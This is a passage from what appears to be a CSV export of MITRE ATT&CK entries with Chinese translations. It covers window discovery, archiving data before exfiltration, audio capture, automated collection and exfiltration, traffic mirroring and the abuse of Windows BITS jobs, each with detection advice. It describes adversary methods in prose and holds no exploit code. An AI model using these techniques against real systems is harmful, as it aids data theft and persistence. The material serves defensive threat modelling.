Mosquito May 2018),(Citation: BlackBerry Bahamut),",应用层协议：Web 协议,攻击者可以使用与 Web 流量相关的应用层协议进行通信，以避免通过与现有流量混合来进行检测/网络过滤。远程系统的命令，通常是这些命令的结果，将嵌入客户端和服务器之间的协议流量中。承载 Web 流量的 HTTP 和 HTTPS 等协议在环境中可能非常常见。 HTTP/S 数据包有许多可以隐藏数据的字段和标头。攻击者可能滥用这些协议与受害网络中受其控制的系统进行通信，同时模仿正常的预期流量。
T1010,Application Window Discovery,Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.(Citation: Prevailion DarkWatchman 2021),https://attack.mitre.org/techniques/T1010,31 May 2017,19 April 2022,1.2,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution, Process: Process Creation",False,,,,,,,,,,"(Citation: Symantec Chafer Dec 2015),(Citation: FireEye APT32 May 2017),(Citation: SecureWorks August 2019),(Citation: Fidelis njRAT June 2013),(Citation: CheckPoint Naikon May 2020),(Citation: Novetta Blockbuster Tools),(Citation: Secureworks Karagany July 2019),(Citation: ATT QakBot April 2021),(Citation: Securelist Remexi Jan 2019),(Citation: ESET Machete July 2019),(Citation: TrendMicro BlackTech June 2017),(Citation: Symantec W32.Duqu),(Citation: Kaspersky NetTraveler),(Citation: ESET InvisiMole June 2020),(Citation: ESET InvisiMole June 2018),(Citation: Novetta Blockbuster Loaders),(Citation: Fortinet Metamorfo Feb 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: Novetta Blockbuster),(Citation: Unit 42 Kazuar May 2017),(Citation: NTT Security Flagpro new December 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: ESET Attor Oct 2019),(Citation: ESET Grandoreiro April 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: Symantec Catchamas April 2018),(Citation: Carbon Black HotCroissant April 2020),(Citation: Volexity PowerDuke November 2016),(Citation: Symantec Darkmoon Aug 2005),(Citation: Prevailion DarkWatchman 2021),(Citation: Talos ROKRAT),(Citation: FireEye APT37 Feb 2018),",应用程序窗口发现,攻击者可能会尝试获取打开的应用程序窗口的列表。窗口列表可以传达有关系统使用方式的信息，或为键盘记录器收集的信息提供上下文。（引用：Prevailion DarkWatchman 2021）
T1560,Archive Collected Data,"An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.

Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",https://attack.mitre.org/techniques/T1560,20 February 2020,04 January 2022,1.0,Collection,"Archival software and archived files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.

A process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures.

Consider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)","Linux, Windows, macOS","Command: Command Execution, File: File Creation, Process: Process Creation, Script: Script Execution",False,,,,,,,,,,"(Citation: ESET Gelsemium June 2021),(Citation: Trustwave Pillowmint June 2020),(Citation: Symantec Chafer Dec 2015),(Citation: trendmicro xcsset xcode project 2020),(Citation: CISA WellMail July 2020),(Citation: CheckPoint Naikon May 2020),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Github PowerShell Empire),(Citation: Symantec Tick Apr 2016),(Citation: Cybereason PowerLess February 2022),(Citation: Symantec Dragonfly),(Citation: Securelist Remexi Jan 2019),(Citation: Cybereason Bumblebee August 2022),(Citation: objsee mac malware 2017),(Citation: ESET Machete July 2019),(Citation: Kaspersky Turla Aug 2014),(Citation: Novetta Blockbuster RATs),(Citation: ESET TeleBots Oct 2018),(Citation: Kaspersky Turla),(Citation: McAfee Gold Dragon),(Citation: ESET OceanLotus Mar 2019),(Citation: DOJ APT10 Dec 2018),(Citation: ESET Sednit Part 2),(Citation: GitHub Bloodhound),(Citation: ESET Operation Groundbait),(Citation: Unit 42 VERMIN Jan 2018),(Citation: ESET Zebrocy Nov 2018),(Citation: ESET Lazarus Jun 2020),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Securelist Dtrack),(Citation: FireEye FELIXROOT July 2018),(Citation: Villeneuve 2011),(Citation: FOX-IT May 2016 Mofang),(Citation: Novetta Blockbuster Loaders),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Novetta-Axiom),(Citation: Talos Agent Tesla Oct 2018),(Citation: BiZone Lizar May 2021),(Citation: FireEye FIN6 April 2016),(Citation: KISA Operation Muzabi),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: US-CERT TA18-074A),(Citation: Fortinet Emotet May 2017),(Citation: Red Canary NETWIRE January 2020),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: ESET ForSSHe December 2018),(Citation: CISA Zebrocy Oct 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Securelist Sofacy Feb 2018),(Citation: Malwarebytes Konni Aug 2021),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: ESET LightNeuron May 2019),",压缩收集的数据,攻击者可能会压缩和/或加密在泄露之前收集的数据。压缩数据有助于混淆收集的数据并最大限度地减少通过网络发送的数据量。加密可用于隐藏从检测中泄露的信息，或在防御者检查时使泄露不那么明显。压缩和加密都是在渗出之前完成的，并且可以使用实用程序、第三方库或自定义方法来执行。
T1560.003,Archive Collected Data: Archive via Custom Method,"An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2)",https://attack.mitre.org/techniques/T1560/003,20 February 2020,25 March 2020,1.0,Collection,"Custom archival methods can be very difficult to detect, since many of them use standard programming language concepts, such as bitwise operations.","Linux, Windows, macOS","File: File Creation, Script: Script Execution",True,T1560,,,,,,,,,"(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Unit 42 RGDoor Jan 2018),(Citation: McAfee Sharpshooter December 2018),(Citation: FireEye APT30),(Citation: Securelist Kimsuky Sept 2013),(Citation: CopyKittens Nov 2015),(Citation: MSTIC FoggyWeb September 2021),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Mandiant UNC3890 Aug 2022),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: ESET Machete July 2019),(Citation: Novetta Blockbuster RATs),(Citation: Symantec W32.Duqu),(Citation: FireEye NETWIRE March 2019),(Citation: ESET InvisiMole June 2018),(Citation: TrendMicro MacOS April 2018),(Citation: ESET Sednit Part 2),(Citation: ThreatExpert Agent.btz),(Citation: Talos Promethium June 2020),(Citation: Bitdefender StrongPity June 2020),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: SentinelOne FrameworkPOS September 2019),(Citation: Dell TG-3390),(Citation: Trend Micro FIN6 October 2019),(Citation: Novetta Blockbuster Loaders),(Citation: ESET Okrum July 2019),(Citation: Novetta Blockbuster),(Citation: Avira Mustang Panda January 2020),(Citation: Palo Alto T9000 Feb 2016),(Citation: FireEye HAWKBALL Jun 2019),(Citation: Palo Alto Reaver Nov 2017),(Citation: FireEye FIN6 April 2016),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: ESET Attor Oct 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: BlackBerry CostaRicto November 2020),(Citation: TrendMicro RawPOS April 2015),(Citation: FireEye MESSAGETAP October 2019),(Citation: Visa RawPOS March 2015),(Citation: Eset Ramsay May 2020),",压缩收集的数据：通过自定义方法压缩,攻击者可能会使用自定义方法压缩或加密在泄露之前收集的数据。攻击者可以选择使用自定义存档方法，例如使用 XOR 加密或在没有外部库或实用程序引用的情况下实现的流密码。还使用了众所周知的压缩算法的自定义实现。（引用：ESET Sednit 第 2 部分）
T1560.002,Archive Collected Data: Archive via Library,"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.

Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",https://attack.mitre.org/techniques/T1560/002,20 February 2020,29 March 2020,1.0,Collection,"Monitor processes for accesses to known archival libraries. This may yield a significant number of benign events, depending on how systems in the environment are typically used.

Consider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)","Linux, Windows, macOS","File: File Creation, Script: Script Execution",True,T1560,,,,,,,,,"(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Kaspersky Turla Aug 2014),(Citation: Novetta Blockbuster RATs),(Citation: Kaspersky TajMahal April 2019),(Citation: ESET InvisiMole June 2020),(Citation: Accenture MUDCARP March 2019),(Citation: ESET InvisiMole June 2018),(Citation: Mandiant No Easy Breach),(Citation: Palo Alto Networks BBSRAT),(Citation: Cylance Dust Storm),(Citation: Securelist Denis April 2017),(Citation: MSTIC FoggyWeb September 2021),",压缩收集的数据：通过依赖库压缩,攻击者可能会使用 3rd 方库压缩或加密在泄露之前收集的数据。存在许多可以存档数据的库，包括 [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR)、libzip (Citation: libzip) 和 zlib (Citation: Zlib GitHub）。大多数库都包含加密和/或压缩数据的功能。系统上预装了一些归档库，例如 macOS 和 Linux 上的 bzip2，以及 Windows 上的 zip。请注意，库与实用程序不同。编译时可以链接库，而实用程序需要生成子外壳或类似的执行机制。
T1560.001,Archive Collected Data: Archive via Utility,"Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.

Adversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. On Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) Additionally, <code>xcopy</code> on Windows can copy files and directories with a variety of options.

Adversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)",https://attack.mitre.org/techniques/T1560/001,20 February 2020,20 April 2022,1.1,Collection,"Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.

Consider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)","Linux, Windows, macOS","Command: Command Execution, File: File Creation, Process: Process Creation",True,T1560,,Mayan Arora aka Mayan Mohan,,,,,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Morphisec ShellTea June 2019),(Citation: Microsoft GALLIUM December 2019),(Citation: Symantec Calisto July 2018),(Citation: Mandiant APT1),(Citation: Cycraft Chimera April 2020),(Citation: Volexity SolarWinds),(Citation: aptsim),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Symantec Cicada November 2020),(Citation: FireEye APT37 Feb 2018),(Citation: Microsoft NICKEL December 2021),(Citation: Symantec Elfin Mar 2019),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: FoxIT Wocao December 2019),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Symantec Sowbug Nov 2017),(Citation: FireEye APT39 Jan 2019),(Citation: Symantec Tick Apr 2016),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Symantec Gallmaker Oct 2018),(Citation: GitHub Pupy),(Citation: objsee mac malware 2017),(Citation: Rclone),(Citation: Trend Micro Tick November 2019),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Securelist Calisto July 2018),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: ESET Crutch December 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: ClearSky Wilted Tulip July 2017),(Citation: ESET InvisiMole June 2018),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: FireEye APT41 Aug 2019),(Citation: Antiy CERT Ramsay April 2020),(Citation: CrowdStrike IceApple May 2022),(Citation: Cybereason Soft Cell June 2019),(Citation: PWC Cloud Hopper April 2017),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Radware Micropsia July 2018),(Citation: Symantec Waterbug Jun 2019),(Citation: FireEye APT35 2018),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Kaspersky MoleRATs April 2019),(Citation: ESET Nomadic Octopus 2018),(Citation: Volexity Exchange Marauder March 2021),(Citation: ESET Okrum July 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: Microsoft HAFNIUM March 2020),(Citation: Avira Mustang Panda January 2020),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: GitHub PoshC2),(Citation: NCC Group Chimera January 2021),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Honeybee),(Citation: objective-see windtail2 jan 2019),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Eset Ramsay May 2020),(Citation: Symantec MuddyWater Dec 2018),(Citation: Talos PoetRAT April 2020),",压缩收集的数据：通过实用程序压缩,攻击者可能会在泄露之前使用实用程序来压缩和/或加密收集的数据。许多实用程序包括将数据压缩、加密或以其他方式打包成更容易/更安全传输的格式的功能。攻击者可能会滥用各种实用程序在泄露之前压缩或加密数据。某些第三方实用程序可能已预先安装，例如 Linux 和 macOS 上的 <code>tar</code> 或 Windows 系统上的 <code>zip</code>。在 Windows 上，<code>diantz</code> 或 <code> makecab</code> 可用于将收集的文件打包成一个cabinet (.cab) 文件。 <code>diantz</code> 也可用于从远程位置下载和压缩文件（即 [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)）。（引用：diantz .exe_lolbas) 此外，Windows 上的 <code>xcopy</code> 可以通过多种选项复制文件和目录。攻击者也可以使用第三方实用程序，例如 7-Zip、WinRAR 和 WinZip，来执行类似的活动。（引文：7zip 主页）（引文：WinRAR 主页）（引文：WinZip 主页）
T1123,Audio Capture,"An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.

Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",https://attack.mitre.org/techniques/T1123,31 May 2017,14 July 2020,1.0,Collection,"Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.

Behavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data.","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution",False,,,,User,,,CAPEC-634,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Symantec Chafer Dec 2015),(Citation: Kaspersky Flame Functionality),(Citation: Kaspersky Adwind Feb 2016),(Citation: Cylance Shaheen Nov 2018),(Citation: EFF Manul Aug 2016),(Citation: Fortinet Remcos Feb 2017),(Citation: objsee mac malware 2017),(Citation: GitHub Pupy),(Citation: Imminent Unit42 Dec2019),(Citation: ESET InvisiMole June 2020),(Citation: ESET InvisiMole June 2018),(Citation: f-secure janicab),(Citation: GitHub PowerSploit May 2012),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: FireEye Periscope March 2018),(Citation: Malwarebytes DarkComet March 2018),(Citation: 360 Machete Sep 2020),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Cylance Machete Mar 2017),(Citation: Objective-See MacMa Nov 2021),(Citation: Radware Micropsia July 2018),(Citation: PaloAlto NanoCore Feb 2016),(Citation: Kaspersky Flame),(Citation: DigiTrust NanoCore Jan 2017),(Citation: Zscaler Cobian Aug 2017),(Citation: Securelist ScarCruft May 2019),(Citation: Palo Alto T9000 Feb 2016),(Citation: Securelist Machete Aug 2014),(Citation: Cofense RevengeRAT Feb 2019),(Citation: PowerSploit Documentation),(Citation: ESET Attor Oct 2019),(Citation: Janicab),(Citation: Kaspersky TajMahal April 2019),(Citation: Unit 42 Nokki Oct 2018),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: FireEye APT37 Feb 2018),(Citation: TrendMicro DarkComet Sept 2014),",音频捕获,攻击者可以利用计算机的外围设备（例如，麦克风和网络摄像头）或应用程序（例如，语音和视频呼叫服务）来捕获音频记录，以便收听敏感对话以收集信息。恶意软件或脚本可用于通过操作系统或应用程序提供的可用 API 与设备交互以捕获音频。音频文件可能会被写入磁盘并在以后被泄露。
T1119,Automated Collection,"Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. In cloud-based environments, adversaries may also use cloud APIs, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. This functionality could also be built into remote access tools. 

This technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.",https://attack.mitre.org/techniques/T1119,31 May 2017,11 April 2022,1.1,Collection,"Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as [Data Staged](https://attack.mitre.org/techniques/T1074). As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), as well as through cloud APIs and command line interfaces.","IaaS, Linux, SaaS, Windows, macOS","Command: Command Execution, File: File Access, Script: Script Execution",False,,,Praetorian,,,"Permissions to access directories, files, and API endpoints that store information of interest.",,,,"(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Mandiant APT1),(Citation: Symantec Cicada November 2020),(Citation: ESET Gamaredon June 2020),(Citation: Microsoft NICKEL December 2021),(Citation: McAfee Bankshot),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: FoxIT Wocao December 2019),(Citation: Talos Frankenstein June 2019),(Citation: Unit42 Redaman January 2019),(Citation: ESET RTM Feb 2017),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: ATT Sidewinder January 2021),(Citation: Unit 42 Playbook Dec 2017),(Citation: ESET Crutch December 2020),(Citation: ESET InvisiMole June 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Palo Alto OilRig May 2016),(Citation: ESET InvisiMole June 2018),(Citation: ESET Zebrocy Nov 2018),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Bitdefender StrongPity June 2020),(Citation: DOJ GRU Indictment Jul 2018),(Citation: ESET Zebrocy May 2019),(Citation: Radware Micropsia July 2018),(Citation: FOX-IT May 2016 Mofang),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Trend Micro FIN6 October 2019),(Citation: Palo Alto Comnie),(Citation: FireEye Metamorfo Apr 2018),(Citation: Eset Ramsay May 2020),(Citation: Palo Alto T9000 Feb 2016),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: McAfee GhostSecret),(Citation: GitHub PoshC2),(Citation: NCC Group Chimera January 2021),(Citation: FireEye FIN6 April 2016),(Citation: KISA Operation Muzabi),(Citation: ESET Attor Oct 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: SentinelOne Valak June 2020),(Citation: Palo Alto Rover),(Citation: Mythc Documentation),(Citation: Red Canary NETWIRE January 2020),(Citation: Kaspersky TajMahal April 2019),(Citation: objective-see windtail2 jan 2019),(Citation: TrendMicro Patchwork Dec 2017),(Citation: FireEye MESSAGETAP October 2019),(Citation: Roadtools),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: ESET LightNeuron May 2019),(Citation: ESET Sednit USBStealer 2014),(Citation: Talos PoetRAT April 2020),",自动收集,一旦在系统或网络中建立起来，攻击者就可以使用自动化技术来收集内部数据。执行此技术的方法可能包括使用 [命令和脚本解释器](https://attack.mitre.org/techniques/T1059) 来搜索和复制符合设置条件的信息，例如文件类型、位置或名称具体的时间间隔。在基于云的环境中，攻击者还可能使用云 API、命令行界面或提取、转换和加载 (ETL) 服务来自动收集数据。此功能也可以内置到远程访问工具中。该技术可以结合使用其他技术，例如 [文件和目录发现](https://attack.mitre.org/techniques/T1083) 和 [横向工具转移](https://attack.mitre.org/techniques/ T1570) 来识别和移动文件，以及 [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) 和 [Cloud Storage Object Discovery](https://attack.mitre.org/techniques /T1619) 来识别云环境中的资源。
T1020,Automated Exfiltration,"Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. 

When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",https://attack.mitre.org/techniques/T1020,31 May 2017,19 April 2022,1.2,Exfiltration,Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious.,"Linux, Network, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Script: Script Execution",False,,,ExtraHop,,,,,,,"(Citation: ESET Gamaredon June 2020),(Citation: Microsoft NICKEL December 2021),(Citation: F-Secure Cosmicduke),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Talos Frankenstein June 2019),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: ESET Machete July 2019),(Citation: ATT Sidewinder January 2021),(Citation: ESET Crutch December 2020),(Citation: ESET Windigo Mar 2014),(Citation: Bitdefender StrongPity June 2020),(Citation: Talos Promethium June 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: ESET Attor Oct 2019),(Citation: Palo Alto Rover),(Citation: Kaspersky TajMahal April 2019),(Citation: Forcepoint Monsoon),(Citation: ESET LightNeuron May 2019),(Citation: Intezer Doki July 20),(Citation: ESET Sednit USBStealer 2014),",自动窃取,攻击者可能会在收集过程中收集到数据后，通过使用自动处理来泄露敏感文档等数据。当使用自动渗透时，其他渗透技术也可能适用于将信息传输到网络之外，例如 [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) 和 [Exfiltration Over Alternative协议]（https://attack.mitre.org/techniques/T1048）。
T1020.001,Automated Exfiltration: Traffic Duplication,"Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised network infrastructure.  Traffic mirroring is a native feature for some network devices and used for network analysis and may be configured to duplicate traffic and forward to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)

Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other network infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) Adversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",https://attack.mitre.org/techniques/T1020/001,19 October 2020,18 April 2022,1.1,Exfiltration,"Monitor network traffic for uncommon data flows (e.g. unusual network communications, suspicious communications that have never been seen before, communications sending fixed size data packets at regular intervals).  Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. ",Network,"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow",True,T1020,,,,,,CAPEC-117,,,",",自动窃取：流量复制,攻击者可能会利用流量镜像来自动通过受感染的网络基础设施进行数据泄露。流量镜像是某些网络设备的本机功能，用于网络分析，可以配置为复制流量并转发到一个或多个目的地，以供网络分析器或其他监控设备进行分析。 （引用：思科流量镜像）（引用：瞻博网络流量镜像）攻击者可能会滥用流量镜像，通过他们控制的其他网络基础设施来镜像或重定向网络流量。可以通过 [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) 或 [Patch System Image](https://attack.mitre.org/) 对网络设备进行恶意修改以启用流量重定向技术/T1601/001）。（引用：US-CERT-TA18-106A）（引用：思科博客传统设备攻击）攻击者可以结合使用流量复制和[网络嗅探]（https://attack.mitre.org/技术/T1040)、[输入捕获](https://attack.mitre.org/techniques/T1056) 或 [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)取决于对手的目的和目的。
T1197,BITS Jobs,"Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)

Adversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)

BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)",https://attack.mitre.org/techniques/T1197,18 April 2018,14 September 2022,1.3,"Defense Evasion, Persistence","BITS runs as a service and its status can be checked with the Sc query utility (<code>sc query bits</code>).(Citation: Microsoft Issues with BITS July 2011) Active BITS tasks can be enumerated using the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (<code>bitsadmin /list /allusers /verbose</code>).(Citation: Microsoft BITS)

Monitor usage of the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)(Citation: Microsoft BITS) Admin logs, PowerShell logs, and the Windows Event log for BITS activity.(Citation: Elastic - Hunting for Persistence Part 1) Also consider investigating more detailed information about jobs by parsing the BITS job database.(Citation: CTU BITS Malware June 2016)

